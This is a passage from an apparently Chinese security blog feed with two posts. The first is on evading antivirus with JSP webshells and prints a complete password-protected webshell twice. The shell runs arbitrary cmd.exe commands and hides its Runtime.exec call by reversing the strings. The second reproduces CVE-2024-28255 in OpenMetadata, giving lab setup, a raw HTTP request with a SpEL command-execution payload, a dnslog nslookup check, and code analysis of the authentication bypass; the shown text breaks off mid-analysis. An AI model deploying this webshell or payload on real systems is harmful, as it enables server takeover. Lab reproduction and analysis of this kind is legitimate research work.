 &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setmode</span><span class="hljs-params">(JspWriter myout, String ladypwd, String cmd)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;jspweb&quot;</span>.equals(ladypwd))&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(reverseStr(<span class="hljs-string">&quot;emitnuR.gnal.avaj&quot;</span>));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">show</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(reverseStr(<span class="hljs-string">&quot;cexe&quot;</span>), String[].class);<br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,cmd&#125;;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> show.invoke(o,(Object)cmds);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Process) invoke;<br>        InputStream in= p.getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        myout.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((ret = in.read(bs)) != -<span class="hljs-number">1</span>) &#123;<br>           myout.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>    &#125;<br>           myout.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span><br><span class="hljs-comment"> * Version: Apache Tomcat/8.5.99</span><br><span class="hljs-comment"> * Generated at: 2024-05-17 13:45:22 UTC</span><br><span class="hljs-comment"> * Note: The last modified time of this file was set to</span><br><span class="hljs-comment"> *       the last modified time of the source file after</span><br><span class="hljs-comment"> *       generation to assist with modification tracking.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">package</span> org.apache.jsp;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.jsp.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">_1_jsp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.HttpJspBase<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.JspSourceDependent,<br>                 org.apache.jasper.runtime.JspSourceImports &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reverseStr</span><span class="hljs-params">(String str)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(str).reverse().toString();&#125;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.<span class="hljs-type">JspFactory</span> <span class="hljs-variable">_jspxFactory</span> <span class="hljs-operator">=</span><br>          javax.servlet.jsp.JspFactory.getDefaultFactory();<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;<br><br>  <span class="hljs-keyword">static</span> &#123;<br>    _jspx_imports_packages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.LinkedHashSet&lt;&gt;(<span class="hljs-number">4</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;java.io&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);<br>    _jspx_imports_classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.LinkedHashSet&lt;&gt;(<span class="hljs-number">2</span>);<br>    _jspx_imports_classes.add(<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span>);<br>    _jspx_imports_classes.add(<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;<br><br>  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_dependants;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_packages;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_classes;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory <span class="hljs-title function_">_jsp_getExpressionFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _el_expressionfactory;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager <span class="hljs-title function_">_jsp_getInstanceManager</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _jsp_instancemanager;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspInit</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspDestroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspService</span><span class="hljs-params">(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;<br><br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">_jspx_method</span> <span class="hljs-operator">=</span> request.getMethod();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;<br>      response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;<br>    javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><br>    <span class="hljs-keyword">try</span> &#123;<br>      response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>      pageContext = _jspxFactory.getPageContext(<span class="hljs-built_in">this</span>, request, response,<br>      <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-literal">true</span>);<br>      _jspx_page_context = pageContext;<br>      application = pageContext.getServletContext();<br>      config = pageContext.getServletConfig();<br>      session = pageContext.getSession();<br>      out = pageContext.getOut();<br>      _jspx_out = out;<br><br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;\r\n&quot;</span>);<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">ladypwd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    setmode(out,ladypwd,cmd);<br>    &#125;<span class="hljs-keyword">catch</span>(Throwable t) &#123;&#125; <span class="hljs-keyword">finally</span> &#123;_jspxFactory.releasePageContext(_jspx_page_context);&#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setmode</span><span class="hljs-params">(JspWriter myout, String ladypwd, String cmd)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;jspweb&quot;</span>.equals(ladypwd))&#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(reverseStr(<span class="hljs-string">&quot;emitnuR.gnal.avaj&quot;</span>));<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance();<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">show</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(reverseStr(<span class="hljs-string">&quot;cexe&quot;</span>), String[].class);<br>    String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,cmd&#125;;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> show.invoke(o,(Object)cmds);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Process) invoke;<br>    InputStream in= p.getInputStream();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>    <span class="hljs-type">byte</span>[] bs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>    myout.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>    <span class="hljs-keyword">while</span>((ret = in.read(bs)) != -<span class="hljs-number">1</span>) &#123;<br>    myout.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bs));<br>    &#125;<br>    myout.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;<br>      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;<br>        out = _jspx_out;<br>        <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br>              out.flush();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              out.clearBuffer();<br>            &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;<br>        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-literal">null</span>) _jspx_page_context.handlePageException(t);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(t);<br>      &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      _jspxFactory.releasePageContext(_jspx_page_context);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考链接：<a href="https://developer.aliyun.com/article/1160280">浅谈JSP Webshell进阶免杀（三）-阿里云开发者社区</a></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-28255 OpenMetadata平台身份验证绕过漏洞</title>
    <link href="/2025/03/22/CVE-2024-28255-OpenMetadata-%E5%B9%B3%E5%8F%B0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/22/CVE-2024-28255-OpenMetadata-%E5%B9%B3%E5%8F%B0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><strong>0x01 简介</strong></p><p><code>OpenMetadata</code>是一个开源的数据资产元数据管理工具，旨在帮助组织有效地管理和利用数据资产的元数据信息。元数据是关于数据的数据，它描述了数据的特征、结构、含义和关系，是数据管理和数据治理的核心组成部分。</p><p><code>OpenMetadata</code>的主要目标是提供一个集中的平台，帮助用户收集、注册、搜索、发现和血缘追踪数据资产的元数据。通过<code>OpenMetadata</code>，用户可以更好地理解和管理数据资产，提高数据的可信度、可访问性和可发现性。</p><p><strong>0x02 漏洞概述</strong></p><p>该漏洞源于OpenMetadata请求排除的端点时，过滤器将在不验证JWT的情况下返回。攻击者可以使用排除的端点进行身份验证绕过，达到命令执行</p><p><strong>0x03 影响版本</strong></p><p><code>OpenMetadata</code>&#x3D;&#x3D;&lt; 1.2.4</p><p><strong>0x04 环境搭建</strong></p><p><code>kali</code>下docker部署</p><p>创建虚拟环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m venv <span class="hljs-built_in">env</span><br></code></pre></td></tr></table></figure><p>虚拟环境生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> <span class="hljs-built_in">env</span>/bin/activate<br></code></pre></td></tr></table></figure><p>获取<code>openmetadata</code>配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/open-metadata/</span>OpenMetadata<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/1.2.2-release/</span>docker-compose.yml<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/open-metadata/</span>OpenMetadata<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/1.2.2-release/</span>docker-compose-postgres.yml<br></code></pre></td></tr></table></figure><p>拉取镜像，启动容器</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">docker compose -f docker-compose<span class="hljs-selector-class">.yml</span> up <span class="hljs-attr">--detach</span><br>docker compose -f docker-compose-postgres<span class="hljs-selector-class">.yml</span> up <span class="hljs-attr">--detach</span><br></code></pre></td></tr></table></figure><p>访问8585端口</p><p><img src="image-20240411145704576-17128197937953.png" alt="image-20240411145704576"></p><p><strong>0x05 漏洞复现</strong></p><p><code>burpsuite</code>抓包，</p><p>poc</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /api/v1;v1%<span class="hljs-number">2</span>fusers%<span class="hljs-number">2</span>flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%<span class="hljs-number">20</span>java.lang.String(T(java.util.Base64).getDecoder().decode(%<span class="hljs-number">22</span>whoami%<span class="hljs-number">22</span>))) HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.244.133:8585</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">124</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">124</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="image-20240411145949728-17128197937941.png" alt="image-20240411145949728"></p><p>将 nslookup vc8jj3.dnslog.cn  进行base64加密</p><p><img src="image-20240411150021675-17128197937952.png" alt="image-20240411150021675"></p><p><strong>0x06 修复方式</strong></p><p>建议更新当前系统或软件至最新版</p><p><strong>0x07 漏洞分析</strong></p><p>poc</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/api/v1;v1%2fusers%2flogin/events/subscriptions/validation/<span class="hljs-keyword">condition</span>/T(java.lang.Runtime).getRuntime().<span class="hljs-keyword">exec</span>(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22whoami%22)))<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/api/</span>v1;v1<span class="hljs-regexp">/users/</span>login<span class="hljs-regexp">/events/</span>subscriptions<span class="hljs-regexp">/validation/</span>condition/T(java.lang.<span class="hljs-keyword">Runtime</span>).getRuntime().exec(<span class="hljs-keyword">new</span> java.lang.String(T(java.util.Base64).getDecoder().decode(<span class="hljs-string">&quot;whoami&quot;</span>)))<br></code></pre></td></tr></table></figure><p>访问端点：&#x2F;api&#x2F;v1;v1&#x2F;users&#x2F;login&#x2F;events&#x2F;subscriptions&#x2F;validation&#x2F;condition&#x2F;</p><p>SpEL表达式：T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(“whoami”))) </p><p>OpenMetadata-1.3.2-release\openmetadata-service\src\main\java\org\openmetadata\service\security\JwtFilter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SneakyThrows</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">filter</span><span class="hljs-params">(ContainerRequestContext requestContext)</span> &#123;<br>  <span class="hljs-type">UriInfo</span> <span class="hljs-variable">uriInfo</span> <span class="hljs-operator">=</span> requestContext.getUriInfo();   <span class="hljs-comment">//获取url信息</span><br>  <span class="hljs-comment">//使用 Java 8 的 Stream API 和 anyMatch 方法来检查集合中是否有任何元素（即端点）与请求的路径（不区分大小写）匹配。如果找到匹配项，表示当前请求的路径是被排除的，不需要做进一步处理。(如果有集合中的元素就不执行)</span><br>  <span class="hljs-keyword">if</span> (EXCLUDED_ENDPOINTS.stream().anyMatch(endpoint -&gt; uriInfo.getPath().equalsIgnoreCase(endpoint))) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>算是一个绕过黑名单限制，达到未授权的作用。</p><p>接下来看poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/api/v1;v1/users/login/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(&quot;whoami&quot;)))<br></code></pre></td></tr></table></figure><p>通过 <strong>;</strong> 进行路径分割，之后的路径便是</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">v1/users/login/events/subscriptions/validation/condition/<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.lang</span>.Runtime)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>(<span class="hljs-built_in">T</span>(java<span class="hljs-selector-class">.util</span>.Base64)<span 